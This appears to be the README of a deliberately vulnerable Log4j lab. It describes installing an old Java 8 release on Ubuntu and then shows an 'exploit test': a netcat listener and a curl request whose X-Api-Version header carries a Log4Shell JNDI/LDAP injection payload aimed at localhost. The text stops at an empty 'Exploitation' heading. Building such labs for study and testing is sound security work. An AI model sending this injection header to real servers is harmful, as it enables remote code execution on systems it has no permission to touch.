# basic-vulnerable-log4j

## Setup of Vulnerable Java 8
To acquire older java versions you can go to: https://repo.huaweicloud.com/java/jdk/
This gives a directory listing titled "Index of java-local/jdk"
From here, we pick any version that we require. In our case we will go with 8u181-b13
As we are installing on Ubuntu, we pick linux-x64.tar.gz. To extract:
`tar -xf jdk-8u181-linux-x64.tar.gz`

`sudo mkdir /opt/jdk`
`sudo mv jdk1.8.0_181/ /opt/jdk`

Create symbolic links in /usr/bin for java and javac that point to /opt/jdk/jdk1.8.0_181/bin/java and /opt/jdk/jdk1.8.0_181/bin/javac

`update-alternatives --install /usr/bin/java java /opt/jdk/jdk1.8.0_181/bin/java 100`

`update-alternatives --install /usr/bin/javac javac /opt/jdk/jdk1.8.0_181/bin/javac 100`

verify:
`java -version`
`javac -version`

We want to set JAVA_HOME environment variable for all users:
`sudo touch /etc/profile.d/java-home.sh`
`sudo echo "export JAVA_HOME=/opt/jdk/jdk1.8.0_181/" >> /etc/profile.d/java-home.sh`
`source /etc/profile.d/java-home.sh`

Setting up tomcat to deploy application

exploit test:
`nc -lvnp 9999`

```
curl --location 'http://localhost:8080/heroes' \
--header 'X-Api-Version: ${jndi:ldap://127.0.0.1:9999}'
```

## Exploitation:
